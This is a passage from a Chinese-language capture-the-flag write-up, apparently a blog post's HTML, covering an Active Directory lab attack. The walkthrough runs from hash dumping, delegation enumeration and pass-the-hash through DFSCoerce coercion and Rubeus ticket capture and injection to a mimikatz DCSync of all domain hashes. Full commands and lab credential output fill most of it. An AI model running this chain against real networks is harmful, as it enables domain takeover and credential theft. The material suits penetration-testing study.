class="line"></span><br><span class="line">flag02: flag&#123;d7ff695a-b34a-448c-957d-126f95e340c5&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="flag03、04——非约束性委派"><a href="#flag03、04——非约束性委派" class="headerlink" title="flag03、04——非约束性委派"></a>flag03、04——非约束性委派</h2><p>再整理一下，已拿下两台主机</p>
+<p>接下来可以尝试获取DC的权限了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.4.45     XIAORANG\WIN19   已拿下</span><br><span class="line">172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter</span><br><span class="line">172.22.4.19   FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393</span><br><span class="line">172.22.4.36   本机 已拿下</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们先来dump一下系统中的用户的hash</p>
+<p>这里获取到了administrator的hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::</span><br><span class="line">Adrian:1003:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebddafd2dd43e:::</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>这些命令也是在msf运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi 加载mimikatz</span><br><span class="line">cred_all 导出所有Hash</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里也可以看见WIN19$是本机的机器用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Username  Domain    NTLM                              SHA1</span><br><span class="line">--------  ------    ----                              ----</span><br><span class="line">Adrian    WIN19     161cff084477fe596a5db81874498a24  d669f3bccf14bf77d64667ec65aae32d2d10039d</span><br><span class="line">WIN19$    XIAORANG  5943c35371c96f19bda7b8e67d041727  5a4dc280e89974fdec8cf1b2b76399d26f39b8f8</span><br><span class="line">WIN19$    XIAORANG  dbee1706b84bb6f5ed05e5b7c0a8e86a  cd8ce51655a9222089cb82e3d77f572974d5faea</span><br><span class="line"></span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Username  Domain    Password</span><br><span class="line">--------  ------    --------</span><br><span class="line">(null)    (null)    (null)</span><br><span class="line">Adrian    WIN19     (null)</span><br><span class="line">WIN19$    XIAORANG  (null)</span><br><span class="line"></span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Username  Domain        Password</span><br><span class="line">--------  ------        --------</span><br><span class="line">(null)    (null)        (null)</span><br><span class="line">Adrian    WIN19         (null)</span><br><span class="line">WIN19$    xiaorang.lab  3a 94 de 4d 87 8e 7d 46 88 ec 9c 70 fd f0 c5 3e 4c f3 ce 6a 80 79 46 c6 2f f9 52 9b 4e 1d 90 58 52 2a 4e ac bf 05 09 08 06 0c 4b a9 a2 aa a2 9d db 0d f8 09 82 c0 6e f4 1b 81 93 59 67 54 de 17 82 d7 c3 82 c5 38 13 4f d0 55 98 f6 a2 cc e7 cb 85 8</span><br><span class="line">                        4 35 8a 0c 2e 9f d1 90 0c 0f c1 ea 0d d9 c5 d9 7f 29 a3 57 46 6b bf a4 b9 73 9a 80 84 1d <span class="built_in">df</span> 3f 33 f5 16 e4 ee 2e d3 88 92 <span class="built_in">cd</span> a5 6e ac e3 eb 71 43 ed 7c b8 a2 9e 52 d5 31 1c 50 9b c8 71 03 e1 8e 4f 60 53 84 13 19 02 e2 8d 92 3f dc 0b 38 2c 13 c1</span><br><span class="line">                         0e 6b 64 a7 <span class="built_in">fc</span> 7a 2a a5 0e e0 b0 66 a9 a0 2f 8d 8d 40 f8 72 d3 36 d3 3a a9 0d 3f b9 00 ef 3e 90 d9 36 a2 ad 36 2a 22 <span class="built_in">cd</span> a0 cc 5b f4 0e a4 6b d3 24 8e 6e 99 59 96 d9 f8 a7 26 09 58 0a c2 3a 69 56 76 40 b9 10 92 a7 5c aa 3d e1 d0 1f</span><br><span class="line">WIN19$    xiaorang.lab  c8 4e c4 16 11 96 8c 11 40 c8 26 8e 38 4f c2 d3 4e a9 48 02 77 6a a8 d2 0c 51 0f 86 d7 c1 95 7c a1 32 d0 12 e5 e7 6b 5e e0 63 a4 7e ba d4 a6 33 81 3e 77 f5 d9 8e 53 52 c2 39 54 e2 13 8f 7a 68 22 f3 c4 51 05 d7 c3 c0 3c e1 9d 72 6b 82 d2 10 af f</span><br><span class="line">                        5 28 70 d7 3d 37 b7 7a 34 2b f2 57 d7 25 38 a4 5d 46 b5 bd 16 da 51 f9 29 4b 34 5b fa e4 6b 3b 62 30 4d a3 d3 a6 5b 04 9a ab a5 89 bc e6 bc 99 2c fb c7 8d ef f6 db 1a f6 60 a4 bb 84 bc 80 0a e8 5b e2 2c 20 85 8d b0 91 e1 b0 00 80 06 00 32 fb 66</span><br><span class="line">                         eb 31 d9 1a a9 b0 2b d1 da 3a 39 78 53 11 1b 7b 6b 0f f7 7f 3d 33 51 98 fd ba 9d 36 19 a5 c5 7e 19 78 d0 2b f6 e1 31 d3 0c 17 03 91 d2 44 46 25 56 04 cb ac 58 1b 6e 65 69 20 fa 25 e0 93 d5 d3 a1 2a ae 30 65 f9 11 95 cc 11 d5 8b 58</span><br><span class="line">win19$    XIAORANG.LAB  c8 4e c4 16 11 96 8c 11 40 c8 26 8e 38 4f c2 d3 4e a9 48 02 77 6a a8 d2 0c 51 0f 86 d7 c1 95 7c a1 32 d0 12 e5 e7 6b 5e e0 63 a4 7e ba d4 a6 33 81 3e 77 f5 d9 8e 53 52 c2 39 54 e2 13 8f 7a 68 22 f3 c4 51 05 d7 c3 c0 3c e1 9d 72 6b 82 d2 10 af f</span><br><span class="line">                        5 28 70 d7 3d 37 b7 7a 34 2b f2 57 d7 25 38 a4 5d 46 b5 bd 16 da 51 f9 29 4b 34 5b fa e4 6b 3b 62 30 4d a3 d3 a6 5b 04 9a ab a5 89 bc e6 bc 99 2c fb c7 8d ef f6 db 1a f6 60 a4 bb 84 bc 80 0a e8 5b e2 2c 20 85 8d b0 91 e1 b0 00 80 06 00 32 fb 66</span><br><span class="line">                         eb 31 d9 1a a9 b0 2b d1 da 3a 39 78 53 11 1b 7b 6b 0f f7 7f 3d 33 51 98 fd ba 9d 36 19 a5 c5 7e 19 78 d0 2b f6 e1 31 d3 0c 17 03 91 d2 44 46 25 56 04 cb ac 58 1b 6e 65 69 20 fa 25 e0 93 d5 d3 a1 2a ae 30 65 f9 11 95 cc 11 d5 8b 58</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>接下来使用工具进行横向，发现都没成功</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/20.png"></p>
+<p>那就测一下是否存在委派</p>
+<p>接下来的操作需要执行该软件的用户在域内，也就是system的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询域中配置非约束性委派的主机</span></span><br><span class="line">.\AdFind.exe -b <span class="string">&quot;DC=xiaorang,DC=lab&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询域中配置非约束性委派的服务账户</span></span><br><span class="line">.\AdFind.exe -b <span class="string">&quot;DC=xiaorang,DC=lab&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里用套件直接获取system权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py Administrator@172.22.4.45  -hashes 00000000000000000000000000000000:ba21c629d9fd56aff10c3e826323e6ab -codec gbk</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/21.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/22.png"></p>
+<p>可以看见在域内,运行这条命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.\AdFind.exe -b <span class="string">&quot;DC=xiaorang,DC=lab&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者使用套件中的进行查询，套件的<span class="built_in">hash</span>为机器用户的<span class="built_in">hash</span></span><br><span class="line">proxychains4 impacket-findDelegation xiaorang.lab/<span class="string">&#x27;WIN19$&#x27;</span> -hashes :dbee1706b84bb6f5ed05e5b7c0a8e86a -dc-ip 172.22.4.7</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里查到为非约束委派</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/23.png"></p>
+<p>这里创个账号</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/24.png"></p>
+<p>添加个用户</p>
+<p>RDP连接后传adfind、mimikatz</p>
+<p>其实随便传个用户的桌面上就好</p>
+<p>这个rdp建议用win，好直接拉</p>
+<p>然后就是再次抓取密码，以确定哪个是机器用户的hash</p>
+<p>这里忘截图了，可以去看看Brute4road的那份wp，周报有</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line"><span class="built_in">log</span> 1.txt  <span class="comment">#将hash记录在1.txt，方便查找</span></span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>接下来的操作就是进行委派攻击了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ba21c629d9fd56aff10c3e826323e6ab</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbee1706b84bb6f5ed05e5b7c0a8e86a</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>这个可以直接在本地管理员运行就可以了，但我这里直接也用system了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里劫持着</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">c:\Users\<span class="built_in">test</span>\Desktop&gt; Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$</span><br><span class="line">   ______        _                      </span><br><span class="line">  (_____ \      | |                     </span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___ </span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.2.0 </span><br><span class="line"></span><br><span class="line">[*] Action: TGT Monitoring</span><br><span class="line">[*] Target user     : DC01$</span><br><span class="line">[*] Monitoring every 1 seconds <span class="keyword">for</span> new TGTs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] 2025/4/17 12:47:53 UTC - Found new TGT:</span><br><span class="line"></span><br><span class="line">  User                  :  DC01<span class="variable">$@XIAORANG</span>.LAB</span><br><span class="line">  StartTime             :  2025/4/17 18:30:28</span><br><span class="line">  EndTime               :  2025/4/18 4:30:28</span><br><span class="line">  RenewTill             :  2025/4/24 18:30:28</span><br><span class="line">  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable</span><br><span class="line">  Base64EncodedTicket   :</span><br><span class="line"></span><br><span class="line">    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD4ereAZNppyfXIFLVpLB7zObk5iqLBnrLVdf0ByONcUmci/OBrOyi4yWwRM5n/jbYy1M7SbsEz3HRqW3en0KLp1l8GlmkP+YwIBSkSLg95XFL5iOhsCSL5i0xgHNVpdLHRRX3j8rEPmt0LSqaX7YMFEK74o8HpgGEgomXPn7KoCAPKXJ7Z81W/KWryzY/uRvoTK/emXzw8GfxH8bGUXYj3+fkjE3FHEWsIKkRpFBVrtno0rMWuHu81K8UutdG4gXuCdTD/d4UBX5l9tlpWxvHFcyaBQzkanqZxO/I2Y5fAxN45XEDH3lnY2ulKCHRSHYyF1cs9NH1kFvr4/WHE24OsYZLolRo/hnDlbf3m92tXykwuznF4/GUu//fftpWxVRp3JvbcLUWC0DlC2v6RJXDb8IUkIfEAavUWFhSsQc7vFbEbqjc7RPCFvpIiigfNpI9a7VNrSGWFAQHnATrVFLVJqXW6n8MkaukhCKc7njomI6qwYDdKhkidckelP3LYyhYYnKc23NmMkDfdqEwOdXWLeWlmTT65j2n+eWOIGjAohtceChs96F5G8+sqgWgnIs40VHfOSfx9Gitw8prA/1zmunoANcRikaTM4QWyur3RhxvME9MIW5DG4Zj8K0wKSkAzjADt6bJEMmbeJg26L6D//lhMWDeFPGbcrOxqEhcHTZmA9yzcoJDbEudVhYzD86CJXZOJSyEZTq+GLDHs/V1lr+vSW+uJLwgcI0Rrjz9IRhKDBv7QZcmbyAY5Llod0bPua2ix7OH7Z8jJH6mGitcciB0ifhsviwJHPpWD+EcuLcMXUzTqP1WGhtM671THHmpGODlgPaB32JwID5oru9tmmXvf5Z5sFk7HPvilJfXUx7S8Uf95zEfnP7OKJ181UALB2nHNwuuqP1lKLLTlX1g/gf+ejVvuLwKbVZn3my650zaVh1orpfGaEc6CfI1p3b3E+8ycyYQiKwUfrOg2Sq0uqjanhfXtB1SZns1mqXgL1RZf5VaV7IxYjnGei6OJ+L0iIvVjb8qAJtsUwbBPomfhE5Gd2MaGnUxDNlTd7QUaY/u/GCXgdkpwX/0UjnB5i53I4E0Y9WHgmtintLIHlAoyJYVyDiMD6rwhfT3WgYm+ekWsrOqLUzG5uekj+1NkvheMP0BtK+7FCvatuMdf/Jw9Ror7Bh0bYpCZr4Ir8NE8mhPsEjhJhh+9pBPtBrsN7fTx8tQuRVgh7i32MGSgUyH2CorOSADQCoCDeiT47F2JzTFLFrtIozTfsMD5i6p7I437Xl5it5BmUqLzt+OhvQQgLCnIaxfwa7z86SkUYpv8hpiXAxYHNFAaO/0vR3tG1acmva/t6ITiZL4AAk7+rkEUIZllDQ1N2/tZ/hePHfUfKwOk8l4QK+rsMM/n2OVJH7MXgc4gCwm0X3QwZe0DuWypcipyCLSOFUnNyN2UNM1ejgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCDDwDQYukDDru2zsu2EElsPKwtvLfdfwIKk06mp/aRY+6EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDQxNzEwMzAyOFqmERgPMjAyNTA0MTcyMDMwMjhapxEYDzIwMjUwNDI0MTAzMDI4WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/25.png"></p>
+<p>非约束委派，这个需要我们强制域控访问这台主机，才能获取到相关信息，这里利用<code>&lt;font style=&quot;color:rgb(221, 17, 68);&quot;&gt;DFSCoerce&lt;/font&gt;</code>强制DC访问域成员进而获取TGT</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dfscoerce.py -u WIN19$ -hashes :dbee1706b84bb6f5ed05e5b7c0a8e86a -d xiaorang.lab win19 172.22.4.7</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/26.png"></p>
+<p>然后使用Rubeus.exe导入票据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD4ereAZNppyfXIFLVpLB7zObk5iqLBnrLVdf0ByONcUmci/OBrOyi4yWwRM5n/jbYy1M7SbsEz3HRqW3en0KLp1l8GlmkP+YwIBSkSLg95XFL5iOhsCSL5i0xgHNVpdLHRRX3j8rEPmt0LSqaX7YMFEK74o8HpgGEgomXPn7KoCAPKXJ7Z81W/KWryzY/uRvoTK/emXzw8GfxH8bGUXYj3+fkjE3FHEWsIKkRpFBVrtno0rMWuHu81K8UutdG4gXuCdTD/d4UBX5l9tlpWxvHFcyaBQzkanqZxO/I2Y5fAxN45XEDH3lnY2ulKCHRSHYyF1cs9NH1kFvr4/WHE24OsYZLolRo/hnDlbf3m92tXykwuznF4/GUu//fftpWxVRp3JvbcLUWC0DlC2v6RJXDb8IUkIfEAavUWFhSsQc7vFbEbqjc7RPCFvpIiigfNpI9a7VNrSGWFAQHnATrVFLVJqXW6n8MkaukhCKc7njomI6qwYDdKhkidckelP3LYyhYYnKc23NmMkDfdqEwOdXWLeWlmTT65j2n+eWOIGjAohtceChs96F5G8+sqgWgnIs40VHfOSfx9Gitw8prA/1zmunoANcRikaTM4QWyur3RhxvME9MIW5DG4Zj8K0wKSkAzjADt6bJEMmbeJg26L6D//lhMWDeFPGbcrOxqEhcHTZmA9yzcoJDbEudVhYzD86CJXZOJSyEZTq+GLDHs/V1lr+vSW+uJLwgcI0Rrjz9IRhKDBv7QZcmbyAY5Llod0bPua2ix7OH7Z8jJH6mGitcciB0ifhsviwJHPpWD+EcuLcMXUzTqP1WGhtM671THHmpGODlgPaB32JwID5oru9tmmXvf5Z5sFk7HPvilJfXUx7S8Uf95zEfnP7OKJ181UALB2nHNwuuqP1lKLLTlX1g/gf+ejVvuLwKbVZn3my650zaVh1orpfGaEc6CfI1p3b3E+8ycyYQiKwUfrOg2Sq0uqjanhfXtB1SZns1mqXgL1RZf5VaV7IxYjnGei6OJ+L0iIvVjb8qAJtsUwbBPomfhE5Gd2MaGnUxDNlTd7QUaY/u/GCXgdkpwX/0UjnB5i53I4E0Y9WHgmtintLIHlAoyJYVyDiMD6rwhfT3WgYm+ekWsrOqLUzG5uekj+1NkvheMP0BtK+7FCvatuMdf/Jw9Ror7Bh0bYpCZr4Ir8NE8mhPsEjhJhh+9pBPtBrsN7fTx8tQuRVgh7i32MGSgUyH2CorOSADQCoCDeiT47F2JzTFLFrtIozTfsMD5i6p7I437Xl5it5BmUqLzt+OhvQQgLCnIaxfwa7z86SkUYpv8hpiXAxYHNFAaO/0vR3tG1acmva/t6ITiZL4AAk7+rkEUIZllDQ1N2/tZ/hePHfUfKwOk8l4QK+rsMM/n2OVJH7MXgc4gCwm0X3QwZe0DuWypcipyCLSOFUnNyN2UNM1ejgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCDDwDQYukDDru2zsu2EElsPKwtvLfdfwIKk06mp/aRY+6EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDQxNzEwMzAyOFqmERgPMjAyNTA0MTcyMDMwMjhapxEYDzIwMjUwNDI0MTAzMDI4WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/27.png"></p>
+<h3 id="DCsync攻击–获取hash横向"><a href="#DCsync攻击–获取hash横向" class="headerlink" title="DCsync攻击–获取hash横向"></a>DCsync攻击–获取hash横向</h3><p>其实就是再重新抓取一下hash</p>
+<p>也是成功抓到域管的hash了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\<span class="built_in">test</span>\Desktop&gt; mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) <span class="comment">#19041 Sep 19 2022 17:44:08</span></span><br><span class="line"> .## ^ <span class="comment">##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># lsadump::dcsync /domain:xiaorang.lab /all /csv</span></span><br><span class="line">[DC] <span class="string">&#x27;xiaorang.lab&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server</span><br><span class="line">[DC] Exporting domain <span class="string">&#x27;xiaorang.lab&#x27;</span></span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502	krbtgt	767e06b9c74fd628dd13785006a9092b	514</span><br><span class="line">1105	Aldrich	98ce19dd5ce74f670d230c7b1aa016d0	512</span><br><span class="line">1106	Marcus	b91c7cc463735bf0e599a2d0a04df110	512</span><br><span class="line">1112	WIN-3X7U15C2XDM$	c3ddf0ffd17c48e6c40e6eda9c9fbaf7	4096</span><br><span class="line">1113	WIN-YUUAW2QG9MF$	125d0e9790105be68deb6002690fc91b	4096</span><br><span class="line">1000	DC01$	2d26b66683d29d32ca8f7aa55451c6f2	532480</span><br><span class="line">500	Administrator	4889f6553239ace1f7c47fa2c619c252	512</span><br><span class="line">1103	FILESERVER$	0fc3b6a1325be6483f48f665c57ae01e	4096</span><br><span class="line">1104	WIN19$	dbee1706b84bb6f5ed05e5b7c0a8e86a	528384</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+<p>获取flag03</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(root?kali)-[/home/kali/red]</span><br><span class="line">└─# proxychains4 impacket-psexec xiaorang/Administrator@172.22.4.19 -hashes :4889f6553239ace1f7c47fa2c619c252 -codec gbk </span><br><span class="line"></span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  47.113.229.136:1123  ...  172.22.4.19:445  ...  OK</span><br><span class="line">[*] Requesting shares on 172.22.4.19.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file KGsavIuf.exe</span><br><span class="line">[*] Opening SVCManager on 172.22.4.19.....</span><br><span class="line">[*] Creating service GQdS on 172.22.4.19.....</span><br><span class="line">[*] Starting service GQdS.....</span><br><span class="line">[proxychains] Strict chain  ...  47.113.229.136:1123  ...  172.22.4.19:445  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  47.113.229.136:1123  ...  172.22.4.19:445  ...  OK</span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands                                                                                                                                                                                                                                      [proxychains] Strict chain  ...  47.113.229.136:1123  ...  172.22.4.19:445  ...  OK</span><br><span class="line">Microsoft Windows [版本 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\windows\system32&gt; <span class="built_in">cd</span> C:\Users\Administrator\flag</span><br><span class="line">C:\Users\Administrator\flag&gt; <span class="built_in">type</span> flag03.txt                                                                                                                                                                                                                                    . .       . .       .         . .       . .       . .       . .    .    .       . .       . .    </span><br><span class="line">.+<span class="string">&#x27;|=|`+. 